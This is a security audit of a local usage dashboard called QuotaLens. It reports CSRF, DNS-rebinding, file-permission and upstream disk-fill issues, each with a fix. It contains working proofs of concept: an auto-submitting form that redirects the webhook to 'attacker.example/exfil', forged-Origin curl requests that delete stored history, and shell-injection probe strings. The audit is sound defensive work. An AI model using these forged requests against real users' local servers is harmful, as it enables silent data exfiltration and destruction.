# QuotaLens — Security audit (Phase A), 2026-09-06

**Audited tree:** `quotalens` @ `3b7d2ec84de5feaa2d7e86c889b23a06673787f4` (tree clean).
**Sibling site:** `quotalens-web` @ `ad9e605e00cf7fb9909ad3cfda4b912f608141b2`.
**Published repo is behind the audit:** `origin/master` is `c1891b9` (v0.1.0), **21 commits behind** the audited tree. The real remote is `github.com/amitshcc/quotalens`.

Method: read the request code paths end to end, then ran a real `quotalens serve` (MemorySecretStore cookie, fake upstream) on loopback and drove the attacks against it — cross-origin form POSTs from a static page on a different origin submitted by headless Chromium (Playwright 1.56), same-machine `curl` with foreign `Origin`/`Host` headers, and unit-level attacks on the notifier escaping. Every claim below is **verified** (command + output, or `file:line`), **false** (with a repro), or **not checkable here** (with why). Adversary ranking, most-reachable first: *a website the user visits* > *another local account* > *hostile upstream* > *supply chain*.

---

## 1. Ship blockers

Anything an ordinary website can do to a user running this, plus any false security claim.

| # | Blocker | Severity | Effort |
|---|---------|----------|--------|
| B1 | **CSRF: any website can rewrite the exfiltration webhook.** A page the user visits while the dashboard runs silently POSTs `webhook_url` to an attacker endpoint. Persists to `config.json`, survives restart, user sees nothing. From the next burn-alert crossing on, the attacker receives working-hours telemetry indefinitely. (Finding F1) | **blocker** | S–M |
| B2 | **CSRF: any website can irreversibly destroy history.** A cross-origin `POST /settings/retention` with `confirm=1` sets retention to `1week` and schedules a prune that deletes months of readings. (Finding F2) | **blocker** | S |
| B3 | **CSRF: any website can silently corrupt every panel setting.** `POST /settings` rewrites *all* `PANEL_KEYS` at once, so one forged submit can disable the vendor status row, drop notification thresholds, or push `sample_keep` to its floor. (Finding F3) | **blocker** | S–M |
| B4 | **DNS rebinding: a website can read the dashboard.** No `Host` allow-list; the server answers any `Host`. An attacker domain with a short TTL rebinding to `127.0.0.1` becomes same-origin and can read `/api/quota/series`, `/api/export.json`, `/api/budget`, `/api/health` and the rendered page. (Finding F4) | **blocker** | S |
| B5 | **False marketing claim: "0 bytes leave your machine" / "no third-party requests."** Both are false as written (§7). The cookie goes to claude.ai on every poll (the product's core function), and by default two third-party status GETs (`status.claude.com` **and** `status.openai.com`) go out every 5 minutes. The README states the outbound inventory correctly; the **site** does not. (Finding F9; Phase C owns the site-wording fix and cites this section.) | **blocker** (site copy) | S |

> The blockers are not "the dashboard has no auth" — that is the documented design (README: *"The dashboard is account data with no authentication"*). B1–B4 are about a **remote web page reaching the loopback server from off-machine**, which loopback does not defend against. Keep that distinction: loopback is a network-reachability boundary, not an authentication one.

---

## 2. Findings

Each: adversary → reachable path → runnable PoC → one-sentence impact → smallest honest fix. Severity (blocker/high/medium/low/info) + effort (S/M/L).

### F1 — CSRF sets the webhook; the dashboard becomes an exfil beacon
**Adversary:** any website the user visits while `quotalens serve` runs. **Severity: blocker. Effort: S–M.**

**Reachable path:** `api.py:271` `POST /settings` → `settings_view.apply_form` (`settings_view.py:113`) writes `config.json` and `poller.adopt`. No CSRF token, no `Origin`/`Referer`/`Sec-Fetch-Site` check, no `Host` allow-list anywhere in `api.py`. The body is `application/x-www-form-urlencoded` (parsed by `api.py:_form`), which an HTML `<form>` submits cross-origin with no CORS preflight.

**PoC (verified, headless Chromium, two different origins):** static page on `127.0.0.1:18720` auto-submits a form to `127.0.0.1:18700/settings`:
```html
<form id="f" method="POST" action="http://127.0.0.1:18700/settings">
  <input name="webhook_url" value="https://attacker.example/exfil">
  <input name="interval" value="60"><input name="lookback" value="15">
  <input name="burn_alert" value="20"><input name="sample_keep" value="20000">
  <input name="status_row" value="1"><input name="status_vendors" value="claude,openai">
</form><script>f.submit()</script>
```
Result: browser followed the `303` to `/settings?saved=1`; `config.json` `webhook_url` changed from the sentinel to `https://attacker.example/exfil`. Same result with `curl -X POST -H 'Origin: https://evil.example' …` → `303`, value persisted.

**What actually leaks (established, not assumed):** the webhook body is built by `alerts.payload` (`alerts.py:72`) and carries `event, profile (a local label), ts, rate_pts_per_hour, threshold_pts_per_hour, headroom_pct, session_resets_at, text, url (the local dashboard URL)`. **No cookie, no org id, no account identifier** — confirmed by reading `alerts.py:89-99`. So the impact is *telemetry about your working hours and burn rate*, not credential theft. It is not "something worse," but it is indefinite and invisible.

**Correction to the prompt's chain:** the prompt says *"`POST /api/notify/test` fires it immediately."* **That is false.** `notify_test` (`api.py:354`) calls `notify.send_test`, which is the **desktop-notification** path (`notify.py:385`), not the webhook. The webhook (`alerts.post_webhook`) is fired only from `poller._check_threshold` (`poller.py:572`) on a real burn-rate threshold crossing. I stood up a listener and confirmed `POST /api/notify/test` did **not** hit it. So the exfil is not attacker-triggered on demand; it lands on the next genuine crossing — which, for the unattended-overnight-agent scenario this product exists for, is exactly when it happens.

**One-sentence impact:** a visited website turns the dashboard into a permanent private feed of the user's session burn-rate and working hours to an attacker's server.

**Smallest honest fix:** reject state-changing POSTs whose `Sec-Fetch-Site` is `cross-site`/`cross-origin`, or whose `Origin` is not the configured loopback origin, in one middleware. **This survives the "must work with JavaScript disabled" product rule** — `Sec-Fetch-Site` and `Origin` are browser-set request headers, present on a plain `<form>` POST, requiring no script and no token round-trip. A cookie-double-submit token needs JS to read/echo it and a `SameSite` cookie needs the server to *have* a session cookie (it has none by design), so both fight the no-JS rule; the header check does not. (`SameSite` is moot — there is no cookie to mark.)

### F2 — CSRF destroys history via the retention route
**Adversary:** any website the user visits. **Severity: blocker. Effort: S.**

**Reachable path:** `api.py:312` `POST /settings/retention`. The "irreversible, so confirm first" guard is a *form field* (`form.get("confirm")`, `api.py:329`), which a forged form supplies. Same missing-origin-check as F1.

**PoC (verified):**
```
curl -X POST -H 'Origin: https://evil.example' \
  --data 'retention=1week&confirm=1' http://127.0.0.1:18700/settings/retention
```
→ `303`; `config.json` retention `3months → 1week`; `api.py:349` schedules `prune_now` in a worker thread, which `DELETE`s rows older than the new cutoff and `VACUUM`s. The readings the product describes as *"the product and never pruned"* under a longer setting are gone.

**Impact:** a visited website irreversibly deletes months of the user's usage history.

**Fix:** the same origin/Sec-Fetch-Site middleware as F1 covers this route too.

### F3 — CSRF clobbers the whole settings panel
**Adversary:** any website the user visits. **Severity: blocker (bundled with F1). Effort: S–M.**

**Reachable path:** `settings_save` adopts *every* key in `PANEL_KEYS` (`settings_view.py:37`) from the merged form, and an unchecked box "sends nothing," so a forged POST that omits a key silently clears/defaults it. Observed live: my F1 PoC, by omitting `notify_credits` and the `notify_t*` slots, set `notify_credits=false` and `notify_thresholds=null` as a side effect.

**Impact:** one forged submit can turn off credit-spend alerts, drop all threshold notifications, disable the status row, or set `sample_keep` to its `100` floor (min enforced by `validate`, `config.py:220`) so the next prune discards almost all raw payloads.

**Fix:** covered by the F1 middleware.

### F4 — DNS rebinding: a web page can read the dashboard
**Adversary:** any website the user visits (with a rebinding-capable domain). **Severity: blocker. Effort: S.**

**Reachable path:** there is no `Host`-header validation anywhere in `api.py`, and no CORS middleware (`grep`: none). A cross-origin `fetch()` cannot *read* the JSON today (no `Access-Control-Allow-Origin` header — confirmed: the data endpoints return only `content-type`), so the same-origin policy protects reads **until** the attacker collapses the origin via DNS rebinding, after which their page is same-origin with `127.0.0.1:PORT` and reads everything.

**PoC (the deciding half is verified; full rebind needs a controlled domain):**
```
curl -H 'Host: attacker.example' http://127.0.0.1:18700/api/quota/series
→ 200, real readings JSON
```
The server answers a foreign `Host`, which is the whole question — a rebinding page that has re-pointed `attacker.example` at `127.0.0.1` is then same-origin and its script can read `/api/quota/series`, `/api/export.json`, `/api/budget`, `/api/health`, and the rendered dashboard. I could not complete a live rebind here (no controllable authoritative DNS with a short TTL in this environment — *that* part is not checkable here; a real attacker-controlled domain settles it), but the missing-`Host`-validation precondition is proven and is sufficient.

**Impact:** a visited website reads the user's full usage history, export, and current session state.

**Fix:** a `Host` allow-list middleware that 421/400s any request whose `Host` is not `127.0.0.1[:port]`, `localhost[:port]`, or the configured host — ~one middleware, the standard answer, and it needs no JS. Given the marketing ("loopback only," "0 bytes leave your machine") reads as a security property, this is not optional.

### F5 — No response size cap on the upstream payload → disk-fill
**Adversary:** hostile or spoofed upstream (compromised network path, corporate TLS proxy, future endpoint change). **Severity: medium. Effort: S.**

**Reachable path:** `client.CurlTransport.get` (`client.py:77`) returns `response.text` whole; `_get_json` parses it; `poller._collect` (`poller.py:349`) calls `store.record_sample`, which `json.dumps`-es the payload into the `sample` table verbatim. There is **no size cap** in `client.py` and none in `store.record_sample` (`store.py:328`). A single 100 MB response is stored whole; the `sample_keep` cap (default 20 000 rows) bounds *row count*, not row *size*, and pruning is periodic (every 6 h).

**PoC:** a fake upstream returning a multi-hundred-MB JSON body is stored to `quotalens.db` in one poll; repeat until the disk fills. (Not run to completion here — it is a disk-exhaustion DoS, and running it to exhaustion is destructive; the absent cap is visible at `client.py:77-89` and `store.py:328-334`.)

**Impact:** a hostile upstream (or MITM) can fill the user's disk through the sample table.

**Fix:** cap the read in `CurlTransport.get` (e.g. refuse bodies over a few MB — the real payloads are ~single-digit KB) and raise `ShapeError`/`UpstreamError` past the cap.

### F6 — Database, log, pid and runtime files are created world-readable
**Adversary:** another local account/process on a shared machine (or a home dir synced to a cloud drive). **Severity: medium (shared/synced host); low (single-user laptop). Effort: M (cross-platform).**

**Reachable path:** no `chmod`, `umask`, or `0o600` in `src/` (`grep`: none). Files are created under the process umask.

**PoC (verified, umask 0022, files the app actually created):**
```
644 quotalens.db      (+ .db-wal, .db-shm)   ← whole account history
644 quotalens.log                            ← redacted, but paths/errors
644 quotalens.pid  644 quotalens.runtime.json
600 config.json                              ← see note
```
**Overturn of the prompt's claim for `config.json`:** it is created **0600**, not world-readable — `write_config_file` (`config.py:410`) writes via `tempfile.mkstemp` (which creates 0600) then `os.replace`, so the mode is preserved. The webhook URL is therefore *not* world-readable. The **database is 0644** and is the real exposure: it is the whole quota history. The `VACUUM` copy (`store.py:653`) is written in the same directory / SQLite temp dir at the same umask and deleted after — no worse than the DB itself.

**Impact:** on a shared Linux box or a cloud-synced home directory, any other local user can read months of the owner's working pattern (not a credential — the cookie is in the keyring, and the DB never contains it).

**Fix:** create the data dir `0700` and `os.chmod` the DB/log/runtime to `0600` after creation. On Windows POSIX modes do not apply; the honest answer there is the default per-user profile ACL already restricts other standard users, so the fix is POSIX-only and Windows relies on the profile ACL — say so rather than claiming cross-platform 0600.

### F7 — Private security-report link points at the wrong repository
**Adversary:** n/a (disclosure-surface gap). **Severity: medium. Effort: S.**

**Reachable path:** `.github/ISSUE_TEMPLATE/config.yml` sends "Security issue" to `https://github.com/amitsharma/quotalens/security/advisories/new`, but the real repo is `github.com/amitshcc/quotalens` (`git remote -v`). The private-report path leads to a different/nonexistent repo, so the first serious cookie-handling bug arrives as a public issue — exactly what the RELEASE-CHECKLIST warned against. Compounded by **no `SECURITY.md`, no `CONTRIBUTING.md`** anywhere in the tree (`git ls-files`: none). Draft `SECURITY.md` in §4.

**Fix:** correct the slug to `amitshcc/quotalens` and add `SECURITY.md`.

### F8 — Maintainer's real name and home-directory paths committed in `design/prompts/`
**Adversary:** anyone who reads the public repo. **Severity: low/info. Effort: S.**

**Reachable path (verified, present at the audited tip, not just history):**
```
design/prompts/22-…md:3: Repo: `<repo>`
design/prompts/16-footer.md:27: Database  <data dir>/quotalens.db
```
Leaks the maintainer's real name (`amitsharma`) and local filesystem layout. Not a credential; no history rewrite is *required*, but if these `design/prompts/` files are not meant to ship, scrub them before the repo gets attention.

### F9 — Site copy states outbound-traffic claims that are false by default
**Adversary:** n/a (truth-in-advertising / launch blocker). **Severity: blocker (see B5). Effort: S.** *Phase C owns the site-wording fix; this establishes the facts it cites.*

**Established outbound inventory (full, from the code):**
1. **Provider poll (core).** `curl_cffi` GET to `base_url` (claude.ai): `/api/bootstrap`, `/api/organizations/{org}/usage`, `/api/organizations/{org}/overage_spend_limit`, **carrying the session cookie**, every `poll_interval_s` (default 60 s). TLS verified (see §3 Verified-safe).
2. **Vendor status GETs (default ON).** `status.fetch` (`status.py:173`) → plain GET to `status.claude.com/api/v2/status.json` **and `status.openai.com/api/v2/status.json`** every 300 s, no cookie/identifier/query. Default `status_vendors="claude,openai"` (`config.py:176`). **OpenAI is a third party** the user may have no relationship with, contacted out of the box.
3. **Webhook POST (opt-in, OFF by default).** Only if `webhook_url` set; fires on a burn crossing; body carries no cookie/org id/account id (F1).
4. Everything else is loopback (`service.fetch_json` → `127.0.0.1`) or a local subprocess (desktop notify).

**Can a web page read the dashboard?** Yes — via DNS rebinding (F4). Not via a plain cross-origin fetch (SOP blocks the read; no CORS headers).

**Verdict on the claims, in the required words:**
- **"0 bytes leave your machine"** (`quotalens-web/public/index.html:228`, `COPY.md:80`) — **false.** The session cookie leaves the machine on every poll (that is the product), and two third-party status GETs leave by default.
- **"No analytics, no third-party requests"** (footer on every site page) — **false by default.** `status.openai.com` (a third party) receives a GET every 5 minutes unless the user runs `config set status_row false`.
- The **README** is accurate: it states plainly (`README.md:122`) *"This is the only outbound traffic to anyone other than your provider … on by default … turns it off"* — so the drift is site-vs-code, and the README is the honest version to reconcile the site against.

---

## 3. Verified safe

Worth as much as §1 — this is what a skeptic can re-run.

- **`base_url` is environment-only; the browser cannot redirect where the cookie goes.** Set only from `QUOTALENS_BASE_URL` in `resolve_settings` (`config.py:490`); it is not a `ConfigKey` (`config.py:CONFIG_KEYS`), not in `PANEL_KEYS`, and neither `settings_save` (`replace` over `PANEL_KEYS` fields only, `api.py:293`) nor `settings_retention` (`with_overrides(retention=…)` only) touches it. **Verified live:** a `POST /settings` carrying `base_url=http://evil.example` returned `303`, `config.json` gained no `base_url` key, and `/api/health`'s note still named `claude.ai`. `CONFIG_KEYS_BY_NAME` has no `base_url`. This is the single most important safe property and it holds on every reachable path.
- **The cookie cannot leak to a web attacker or via the DB.** It lives only in the OS keyring (`secrets.KeyringSecretStore`), is added to the process `Redactor` (`secrets.py:149`) which scrubs it and generic `sessionKey=`/`sk-ant-`/`Cookie:` shapes from logs and error strings, and the `/settings` error path never renders it. The DB never stores it (`grep`: no cookie write). The unhandled-exception handler (`api.py:200`) redacts before logging and returns a fixed string.
- **Injection into the page is escaped.** `render.py` routes every externally-sourced string — window/profile labels (`_meter`, `render.py:531`), boost heading/detail (`render.py:789`), the webhook URL redisplayed on validation failure (`_field`, `render.py:1115`/`1126`), and echoed query params (`render.py:583`) — through `html.escape` (imported as `e`, `render.py:7`), which escapes `& < > " '` (quote=True). No unescaped externally-controlled sink was found.
- **`/favicon.svg` is safe.** `favicon_svg` (`render.py:185`) interpolates only a *number* (the session percentage) and static text into the SVG, escaped with `html.escape` (which is XML-safe for text and attribute contexts). **No provider string reaches the SVG**, so the "SVG is a scriptable document" concern does not bite here.
- **The notifier escaping holds for the language it escapes into.** Attacked `_argv` (`notify.py:223`) with `"`+`\`, newline, backtick, `$(…)`, unicode quotes, `';calc;'`:
  - *osascript* — fixed argv (`["osascript","-e", …]`, **no `shell=True`**), so backticks/`$()`/newlines are literal AppleScript, not shell. The body sits in `"…"` and both `"` and `\` are stripped (`notify.py:243`), so nothing can close the string or introduce an escape. A newline makes AppleScript fail to compile (delivery fails, swallowed) — a non-issue, not injection. Pinned by `tests/test_notify.py:112` (`count('"') == 4`).
  - *powershell* — body inside a single-quoted PS string with `'`→`''` (`notify.py:249`); in PS single-quoted strings `'` is the *only* special char (backtick and `$()` are inert), so doubling is sufficient; fixed argv, no `cmd`. Pinned by `tests/test_notify.py:125`.
  - *notify-send* — title/body are argv elements (`notify.py:263`), no shell string; confirmed no Linux path builds one.
  Reachable only by the **upstream/provider** (a crafted `scope.model.display_name` → label), not by the website attacker, and even then it does not inject. Verified-safe, and it overturns the implied gap in §3 of the prompt.
- **TLS verification is ON everywhere outbound.** `client.CurlTransport` uses `AsyncSession(impersonate=…)` (`client.py:75`) with no `verify=False`; `alerts.post_webhook` uses `AsyncSession()` (`alerts.py:109`); `status.fetch` uses `requests.get` (`status.py:185`) — all default `verify=True`. `grep verify=` across `src/`: no disable anywhere. Impersonation ≠ `verify=False`; the code did not confuse them.
- **`/static/{name}` and `/static/vendor/{name}` are not traversable.** Both match a fixed allow-list (`STATIC_FILES`, `api.py:80`; `{v.logo for v in status.VENDORS}`, `api.py:409`) before any path join. Confirmed.
- **`quotalens auth` reads the cookie via a no-echo reader, not argv.** `read_hidden_line` (`cli.py:75`) reads stdin in cbreak/piped mode; the cookie is never in `argv` or shell history. Confirmed.
- **Every `subprocess` call is a fixed argv, no `shell=True`.** `grep shell=True` across `src/`: none. `notify._argv`, `service._spawn_detached`, `service.port_holder`, `service._run` all pass list argv.
- **`python-multipart` CVEs are not reachable.** The venv contains `python-multipart 0.0.26` (multiple advisories), but the app deliberately parses form bodies with stdlib `parse_qsl` (`api.py:_form`, documented at `api.py:125`) and never calls `request.form()`, so starlette's multipart parser is never invoked. Reachability: none.
- **The redactor covers the identifiers actually present.** `mask_uuids` (`export.py:35`) masks org-id-shaped UUIDs in exports and probe output; `probe` default path masks (`cli.py:203`), `--no-redact` opts out with a printed warning (`cli.py:48`). The generic redactor patterns (`secrets.py:36`) catch `sessionKey=`, `Cookie:`, `sk-ant-`.
- **Git history is clean of credentials.** `git rev-list --all` blob scan + `git grep` across all commits: **no** cookie, `sk-ant-`, real org id, `.env`, real `.db`, `.log`, or `probe-output*.json` ever committed. The only UUIDs in history are placeholders (`123e4567-…`, `deadbeef-…`); the only `sessionKey=` hits are source string literals and the redaction regex. `.gitignore` covers `*.db`, `.env`, `probe-output*.json`. (Exception: personal paths in `design/prompts/`, F8 — not a credential.)
- **`release.yml` is not fork-reachable to publish.** No `pull_request` trigger (only `push: tags:v*` + `workflow_dispatch`); top-level `permissions: contents: read`; `id-token: write` is scoped to the `pypi`/`testpypi` jobs gated behind GitHub `environment:`; those jobs only download the artifact and publish (they run no repo code). The `build` job runs repo code but has no `id-token`. A fork PR reaches only `ci.yml`, which is `permissions: contents: read`, has no secrets, and uses `pull_request` (not `pull_request_target`). Good separation.

---

## 4. Draft `SECURITY.md`

```markdown
# Security policy

QuotaLens handles the one credential that is equivalent to your claude.ai
password — your session cookie. Reports about how it is stored, redacted, or
transmitted are the ones that matter most, and I would rather hear them
privately first.

## Reporting a vulnerability

Please **do not open a public issue** for anything involving the session
cookie, credential storage, redaction, the local web server's exposure to
other software on the machine, or a way for a website to reach the dashboard.

Report privately via GitHub's private advisory form:
  https://github.com/amitshcc/quotalens/security/advisories/new

If that is unavailable, email <REPLACE-WITH-A-REAL-ADDRESS> with "QuotaLens
security" in the subject.

## What to expect

This is maintained by one person in evenings, so the timelines are honest
rather than corporate:

- Acknowledgement within **5 working days**.
- An initial assessment (in scope / not / need more info) within **14 days**.
- I will keep you updated at least every **14 days** until it is resolved, and
  credit you in the release notes unless you ask me not to.

## In scope

- The dashboard's exposure to other websites the user visits (CSRF, DNS
  rebinding, anything that reaches `127.0.0.1:<port>` from off-machine).
- Leakage of the session cookie via logs, errors, exports, the database, or the
  config file.
- Handling of a hostile or spoofed upstream response.
- File permissions on the database, config, and logs on a shared machine.
- The release/publish supply chain.

## Out of scope

- The dashboard having no authentication of its own. This is documented design:
  it binds loopback only and there is no `--host`. Reaching it from *another
  machine* is out of scope; reaching it from a *website on the same machine* is
  in scope.
- Anything requiring local root or an already-compromised machine.
- Denial of service against a server you deliberately exposed off-loopback via
  your own proxy.

## Supported versions

Only the latest released version is supported.
```

---

## 5. Residual risk accepted knowingly

Written so a stranger reading the repo can decide for themselves.

- **The dashboard has no authentication.** By design it binds loopback and there is no `--host`. Any software running *as you* on your machine can read it. If you put it behind a proxy, you own the auth. (Documented in README; not a finding — but the CSRF/rebinding blockers above are what make "loopback" insufficient against a *website*, and they should be fixed regardless.)
- **The vendor status row contacts third parties by default.** `status.claude.com` and `status.openai.com` receive one GET each every 5 minutes with no identifier. Turn it off with `quotalens config set status_row false`. This must be disclosed on the site (F9); as a *behaviour* it is a defensible default, once stated.
- **No lockfile; four runtime deps are floors with no ceilings** (`fastapi>=0.115`, `uvicorn>=0.30`, `curl_cffi>=0.10`, `keyring>=25`). A user installing next year resolves versions nobody here has run. For a tool of this size and blast radius (it holds your claude.ai cookie), a lockfile or upper bounds would be cheap insurance; accepting the risk means accepting that a future transitive regression ships silently. `curl_cffi` bundles its own libcurl, so its CVE surface is its own, not the system's. **No `.github/dependabot.yml`** — for an evenings project this is a reasonable omission *if* a lockfile or periodic manual audit replaces it; with neither, dependency drift is unmonitored.
- **CI actions are pinned by moving tag, not SHA** (`actions/checkout@v4`, `setup-python@v5`, `upload/download-artifact@v4`, `pypa/gh-action-pypi-publish@release/v1`). `gh-action-pypi-publish@release/v1` runs in the job that holds `id-token: write` and can publish as this project; a compromised branch ref there is the highest-value supply-chain target. Pin to SHAs before the project gets attention. **(medium; effort S.)**
- **Dependency CVEs on the request hot path are not fully adjudicated here.** `pip-audit` against this (skill-polluted) venv flags `starlette 1.0.0` advisories (PYSEC-2026-161/248/249/2280/2281). Starlette serves every request, so it *has* a call path, but I could not confirm any specific advisory is reachable within budget (several known starlette CVEs are multipart-parser DoS, which this app does not reach — see §3). **Not checkable here per-advisory**; a fresh resolved-install audit against a lockfile would settle it. Other flags (`pypdf`, `soupsieve`, `setuptools`, `wheel`, `urllib3`, `python-multipart`) are not on the app's runtime path and are dropped per the "reachability or nothing" rule.

---

## Not covered (ran within budget; these are the honest gaps)

- **Live DNS rebind to completion** — the missing-`Host`-validation precondition is proven (F4), but an end-to-end rebind needs a controllable authoritative DNS + short TTL, which this environment does not provide.
- **Keyring cross-application read / OS prompt behaviour** — not checkable on this headless Linux box (no keyring backend; `NoKeyringError` on every call). On macOS Keychain a second app reading the `quotalens`/`claude.ai-session-cookie` entry triggers an OS prompt scoped to the storing binary; on Windows Credential Manager it is readable by the same user without a prompt; on Linux Secret Service it depends on the collection lock state. Which of these holds needs a real desktop of each OS to settle — **not checkable here.**
- **Per-advisory starlette reachability** — see Residual risk; needs a lockfile-based resolved-install audit.
- **The 100 MB payload DoS run to completion** — left as code-reading (F5) rather than filling a disk.
